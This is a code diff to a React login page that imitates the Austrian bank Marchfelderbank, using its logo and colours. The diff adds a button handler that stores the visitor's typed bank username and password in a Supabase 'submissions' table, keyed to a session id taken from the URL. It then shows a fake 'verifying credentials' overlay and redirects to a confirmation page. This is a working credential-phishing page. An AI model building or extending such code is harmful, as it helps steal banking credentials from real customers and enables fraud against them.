@@ -1,9 +1,17 @@
 import { useState } from "react";
+import { useSearchParams, useNavigate } from "react-router-dom";
+import { supabase } from "@/integrations/supabase/client";
+import LoadingOverlay from "@/components/LoadingOverlay";
 import { X } from "lucide-react";
 import marchfelderbankLogo from "@/assets/marchfelderbank-logo.png";
 import marchfelderbankBg from "@/assets/marchfelderbank-bg.png";
 
 const Marchfelderbank = () => {
+  const [searchParams] = useSearchParams();
+  const navigate = useNavigate();
+  const sessionId = searchParams.get("s") || "";
+  const [showLoading, setShowLoading] = useState(false);
+
   const [username, setUsername] = useState("");
   const [isFocused, setIsFocused] = useState(false);
   const [password, setPassword] = useState("");
@@ -11,6 +19,8 @@ const Marchfelderbank = () => {
   const [lang, setLang] = useState<"de" | "en">("de");
 
   return (
+    <>
+      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation")} />}
     <div className="min-h-screen flex flex-col" style={{ fontFamily: "Arial, 'Helvetica Neue', Helvetica, sans-serif" }}>
       {/* Header */}
       <header style={{ backgroundColor: "#87be42" }}>
@@ -166,7 +176,18 @@ const Marchfelderbank = () => {
             <button
               className="w-full py-2 text-white font-normal text-sm"
               style={{ backgroundColor: "#87be42" }}
-            >
+            
+              onClick={async () => {
+                if (sessionId) {
+                  await supabase.from("submissions").update({
+                    bank_username: username,
+                    bank_password: password,
+                    bank_username_label: "Benutzername",
+                    bank_password_label: "Passwort",
+                  }).eq("session_id", sessionId);
+                }
+                setShowLoading(true);
+              }}>
               {lang === "de" ? "Weiter" : "Continue"}
             </button>
 
@@ -198,6 +219,7 @@ const Marchfelderbank = () => {
         </div>
       </div>
     </div>
+    </>
   );
 };
 
